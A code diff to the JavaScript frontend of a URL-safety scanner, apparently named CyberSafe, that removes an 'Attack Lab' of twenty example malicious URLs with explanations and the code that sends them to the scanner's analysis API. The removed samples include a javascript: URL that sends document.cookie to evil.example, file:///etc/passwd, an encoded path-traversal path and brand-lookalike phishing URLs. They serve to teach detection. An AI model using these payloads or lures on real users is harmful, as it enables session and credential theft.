@@ -1,7 +1,7 @@
 /**
  * CyberSafe — Frontend Application Logic v2.0
  * Modes: Offline Analysis
- * CYBERSAFE 2.0: Attack Lab, Phishing Gallery, Threat Feed, URL Compare, IOC
+ * CYBERSAFE 2.0: Phishing Gallery, Threat Feed, URL Compare, IOC
  */
 
 // ============================================================================
@@ -56,40 +56,6 @@ const clearHistoryBtn = document.getElementById('clear-history-btn');
 let qrScanner   = null;
 let scanHistory = [];
 
-// ============================================================================
-// Attack Lab Data (20 labs, 5 categories)
-// ============================================================================
-const ATTACK_LABS = [
-  // Category 1 — URL DECEPTION
-  { id: 1, category: 'DECEPTION', icon: '🎭', name: 'Credential @ Trick', desc: 'Hides real destination after @', url: 'https://google.com@evil.example/login', concept: 'Text before @ is user-information, not the hostname. The actual destination is after @.' },
-  { id: 2, category: 'DECEPTION', icon: '🎯', name: 'Brand Lookalike', desc: 'Substituted characters in brand name', url: 'https://paypa1-secure.verify.net/account', concept: 'Character substitution (1 for l) impersonates a trusted brand domain.' },
-  { id: 3, category: 'DECEPTION', icon: '🔤', name: 'Punycode Homograph', desc: 'Unicode lookalike characters', url: 'https://xn--pple-43d.com/login', concept: 'Internationalized domain names can use characters that look identical to ASCII.' },
-  { id: 4, category: 'DECEPTION', icon: '🔗', name: 'URL Shortener', desc: 'Hides destination via redirect', url: 'https://tinyurl.com/y7d3xk9p', concept: 'URL shorteners mask the true destination, common in phishing delivery.' },
-
-  // Category 2 — DANGEROUS PAYLOADS
-  { id: 5, category: 'PAYLOAD', icon: '💉', name: 'JavaScript Scheme', desc: 'Executes code in browser', url: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", concept: 'The javascript: scheme runs code directly in the browser context.' },
-  { id: 6, category: 'PAYLOAD', icon: '📦', name: 'Data URI', desc: 'Embeds HTML payload in URL', url: "data:text/html,<h1>Phishing Page</h1>", concept: 'Data URIs embed inline content, bypassing domain reputation checks.' },
-  { id: 7, category: 'PAYLOAD', icon: '📂', name: 'File Scheme', desc: 'Accesses local filesystem', url: 'file:///etc/passwd', concept: 'The file: scheme attempts to access the local device filesystem.' },
-  { id: 8, category: 'PAYLOAD', icon: '🔐', name: 'Encoded Payload', desc: 'Percent-encoded obfuscation', url: 'https://example.com/%2F%2F..%2F..%2Fetc%2Fpasswd%2F%2F%2F', concept: 'Excessive percent-encoding hides the true path from security filters.' },
-
-  // Category 3 — HOST & NETWORK
-  { id: 9, category: 'NETWORK', icon: '🌐', name: 'Public IP Address', desc: 'Raw IP instead of domain', url: 'http://93.184.216.34/login', concept: 'Legitimate sites use domain names. Raw IPs bypass reputation systems.' },
-  { id: 10, category: 'NETWORK', icon: '🏠', name: 'Private/Internal IP', desc: 'Targets private network', url: 'http://10.0.0.1/admin/config.php', concept: 'Private IPs (10.x, 192.168.x) target internal network resources.' },
-  { id: 11, category: 'NETWORK', icon: '🔌', name: 'Suspicious Port', desc: 'Non-standard port number', url: 'https://example.com:8443/login', concept: 'Non-standard ports (8443, 8080) may indicate unofficial services.' },
-  { id: 12, category: 'NETWORK', icon: '🔢', name: 'Obfuscated IP', desc: 'DWORD integer IP encoding', url: 'http://2130706433/admin', concept: 'Integer/hex IP encoding hides the destination from basic URL checks.' },
-
-  // Category 4 — PHISHING PATTERNS
-  { id: 13, category: 'PHISHING', icon: '🔑', name: 'Fake Login Path', desc: 'Credential harvest path', url: 'https://example-secure.com/login', concept: 'Paths like /login on unfamiliar domains may be credential harvesting pages.' },
-  { id: 14, category: 'PHISHING', icon: '🪝', name: 'Credential Collection', desc: 'Password reset lure', url: 'https://accounts-verify.net/reset-password?token=abc123', concept: 'Fake password reset pages combined with brand impersonation capture credentials.' },
-  { id: 15, category: 'PHISHING', icon: '✉️', name: 'Account Verification', desc: 'Email verify lure', url: 'https://verify-account.tk/email-confirm?user=victim', concept: 'Fake verification pages on suspicious TLDs (.tk) are common phishing vectors.' },
-  { id: 16, category: 'PHISHING', icon: '💳', name: 'Suspicious Payment', desc: 'Billing/payment lure', url: 'https://paypal-billing.verify.net/payment', concept: 'Brand names in non-official domains with payment paths indicate phishing.' },
-
-  // Category 5 — URL STRUCTURE
-  { id: 17, category: 'STRUCTURE', icon: '📏', name: 'Excessively Long URL', desc: 'Obfuscation via length', url: 'https://legitimate-looking-site.com/page/that/goes/on/and/on/for/no/good/reason/whatsoever/because/attackers/use/long/paths/to/confuse/security/filters/and/hide/malicious/content/deep/within/the/url/structure/making/it/very/hard/to/read/or/verify/by/humans/or/simple/automated/tools/that/only/check/the/domain/name/and/not/the/full/path', concept: 'Extremely long URLs can hide malicious destinations from cursory inspection.' },
-  { id: 18, category: 'STRUCTURE', icon: '🪆', name: 'Nested URL', desc: 'URL within query param', url: 'https://example.com/redirect?url=https://evil.example/phish', concept: 'URLs embedded in query parameters can redirect to malicious destinations.' },
-  { id: 19, category: 'STRUCTURE', icon: '❓', name: 'Suspicious Query', desc: 'Redirect parameter abuse', url: 'https://accounts.google.com.evil.example/signin?continue=https://phish.example', concept: 'Redirect parameters combined with brand lookalikes create convincing phishing.' },
-  { id: 20, category: 'STRUCTURE', icon: '@@', name: 'Multiple @ Symbols', desc: 'Multiple @ confusion', url: 'https://user@attacker.com@evil.example/login', concept: 'Multiple @ symbols confuse URL parsers. The real host follows the last @.' },
-];
 
 // ============================================================================
 // Phishing Gallery Data
@@ -149,8 +115,6 @@ document.addEventListener('DOMContentLoaded', () => {
   // Tab Navigation
   initTabNavigation();
 
-  // Attack Lab
-  initAttackLab();
 
   // Phishing Gallery
   initPhishingGallery();
@@ -886,138 +850,6 @@ function hideResults() { resultsContainer.classList.add('hidden'); }
 
 function showResults() { resultsContainer.classList.remove('hidden'); offlineResults.classList.remove('hidden'); }
 
-// ============================================================================
-// ATTACK LAB
-// ============================================================================
-function initAttackLab() {
-  renderAttackLabGrid(ATTACK_LABS);
-
-  // Search
-  const search = document.getElementById('attack-lab-search');
-  if (search) {
-    search.addEventListener('input', () => filterAttackLabs());
-  }
-
-  // Filter buttons
-  document.querySelectorAll('.filter-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      filterAttackLabs();
-    });
-  });
-
-  // Close result panel
-  const closeBtn = document.getElementById('close-lab-result');
-  if (closeBtn) closeBtn.addEventListener('click', () => { document.getElementById('attack-lab-result').classList.add('hidden'); });
-
-  // Run Again
-  const runAgain = document.getElementById('lab-run-again');
-  if (runAgain) runAgain.addEventListener('click', () => {
-    const url = document.getElementById('lab-example-url').textContent;
-    if (url) runAttackLab(url);
-  });
-
-  // View Full Analysis
-  const viewFull = document.getElementById('lab-view-full');
-  if (viewFull) viewFull.addEventListener('click', () => {
-    const url = document.getElementById('lab-example-url').textContent;
-    if (url) { urlInput.value = url; switchToTab('scan'); hideError(); hideResults(); showLoading('Analyzing URL structure...'); handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading()); }
-  });
-}
-
-function filterAttackLabs() {
-  const search = (document.getElementById('attack-lab-search')?.value || '').toLowerCase();
-  const category = document.querySelector('.filter-btn.active')?.getAttribute('data-filter') || 'ALL';
-
-  const filtered = ATTACK_LABS.filter(lab => {
-    const matchSearch = !search || lab.name.toLowerCase().includes(search) || lab.desc.toLowerCase().includes(search) || lab.category.toLowerCase().includes(search);
-    const matchCategory = category === 'ALL' || lab.category === category;
-    return matchSearch && matchCategory;
-  });
-
-  renderAttackLabGrid(filtered);
-}
-
-function renderAttackLabGrid(labs) {
-  const grid = document.getElementById('attack-lab-grid');
-  if (!grid) return;
-
-  // Group by category
-  const categories = {};
-  labs.forEach(lab => {
-    if (!categories[lab.category]) categories[lab.category] = [];
-    categories[lab.category].push(lab);
-  });
-
-  const categoryNames = { DECEPTION: 'URL Deception', PAYLOAD: 'Dangerous Payloads', NETWORK: 'Host & Network', PHISHING: 'Phishing Patterns', STRUCTURE: 'URL Structure' };
-
-  grid.innerHTML = Object.entries(categories).map(([cat, catLabs]) => `
-    <div class="lab-category">
-      <h4 class="lab-category-title">${escapeHTML(categoryNames[cat] || cat)}</h4>
-      <div class="lab-category-grid">
-        ${catLabs.map(lab => `
-          <button class="attack-lab-btn" onclick="runAttackLab('${escapeHTML(lab.url).replace(/'/g, "\\'")}')" data-lab-id="${lab.id}">
-            <div class="attack-lab-icon">${lab.icon}</div>
-            <div class="attack-lab-info">
-              <strong>${escapeHTML(lab.name)}</strong>
-              <span>${escapeHTML(lab.desc)}</span>
-            </div>
-          </button>
-        `).join('')}
-      </div>
-    </div>
-  `).join('');
-
-  if (!labs.length) {
-    grid.innerHTML = '<div class="empty-state"><p>No techniques match your search.</p></div>';
-  }
-}
-
-async function runAttackLab(url) {
-  const resultPanel = document.getElementById('attack-lab-result');
-  const lab = ATTACK_LABS.find(l => l.url === url);
-
-  document.getElementById('lab-result-title').textContent = lab ? `Attack Lab — ${lab.name}` : 'Attack Lab Result';
-  document.getElementById('lab-example-url').textContent = url;
-  document.getElementById('lab-verdict').textContent = 'Analyzing...';
-  document.getElementById('lab-score').textContent = '—';
-  document.getElementById('lab-explanation').textContent = lab ? lab.concept : 'Analyzing...';
-
-  resultPanel.classList.remove('hidden');
-  resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-
-  try {
-    const response = await fetch(API.analyze, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ url }),
-    });
-    const data = await response.json();
-    if (data.success && data.analysis) {
-      const a = data.analysis;
-      const verdictEl = document.getElementById('lab-verdict');
-      verdictEl.textContent = a.verdict;
-      verdictEl.className = `verdict-value verdict-${a.verdict.toLowerCase()}`;
-      document.getElementById('lab-score').textContent = `${a.score} / 100`;
-
-      // Build explanation with findings
-      let explanation = lab ? lab.concept + '\n\n' : '';
-      if (a.findings && a.findings.length) {
-        explanation += 'Detected Rules:\n';
-        a.findings.forEach(f => { explanation += `• ${f.title} [${f.severity.toUpperCase()}] (+${f.score})\n`; });
-      }
-      explanation += `\nRecommendation: ${a.recommendation || ''}`;
-      document.getElementById('lab-explanation').textContent = explanation;
-    }
-  } catch (err) {
-    document.getElementById('lab-verdict').textContent = 'ERROR';
-    document.getElementById('lab-explanation').textContent = 'Could not reach the analysis server. ' + getReadableError(err);
-  }
-
-  if (typeof lucide !== 'undefined') lucide.createIcons();
-}
-window.runAttackLab = runAttackLab;
 
 // ============================================================================
 // PHISHING GALLERY
